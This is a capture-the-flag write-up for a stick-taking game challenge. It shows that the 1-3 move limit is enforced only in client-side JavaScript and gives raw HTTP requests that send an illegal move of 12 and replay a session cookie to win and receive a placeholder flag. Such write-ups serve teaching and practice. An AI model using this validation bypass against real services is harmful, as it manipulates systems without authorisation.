The challenge is about the stick game, you have to remove stick (1-3) turn by turn and the person how remove the last(s) one(s) loose, I first tried to legit play the game the issue is since the bot it starting he has 100% chances to win.

After checking the code we can see that the check for the max number of sticks (3) is checked localy :

```javascript
async function playTurn() {
  const playerChoice = document.getElementById("player_choice").value;
    if (!playerChoice || isNaN(parseInt(playerChoice)) || playerChoice < 1 || playerChoice > 3 ) {
      showAlert("Please select a number between 1 and 3.");
      return;
}
```
So i craft a request where i remove `12` sticks so it left `3` (bot play first and remove 3 (20-3=17).

```
POST /play HTTP/1.1
Host: chall3.midnightflag.fr:12491
Content-Length: 20
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chall3.midnightflag.fr:12491
Referer: http://chall3.midnightflag.fr:12491/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJnYW1lIjoxN30.Z_qGGA.XhU1chxojYQkg4Y6MBtF3xg-xIk
Connection: keep-alive

{"player_choice":12}

---

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 68
Vary: Cookie
Set-Cookie: session=eyJnYW1lIjozfQ.Z_qHkA.B9yjgyYgCNVCMDdmg14C7F6Ye1A; HttpOnly; Path=/

{"board":["|","|","|"],"bot_move":2,"game_ended":false,"win":false}
```
We know just have to remove two so it let him one and he loose. To do that get the cookie given and replay it to resume party.

```
POST /play HTTP/1.1
Host: chall3.midnightflag.fr:12491
Content-Length: 19
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chall3.midnightflag.fr:12491
Referer: http://chall3.midnightflag.fr:12491/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJnYW1lIjozfQ.Z_qHkA.B9yjgyYgCNVCMDdmg14C7F6Ye1A
Connection: keep-alive

{"player_choice":2}

---

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 82
Vary: Cookie
Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; HttpOnly; Path=/

{"board":["|"],"flag":"MCTF{FAKE_FLAG_FOR_TESTING}","game_ended":true,"win":true}
```





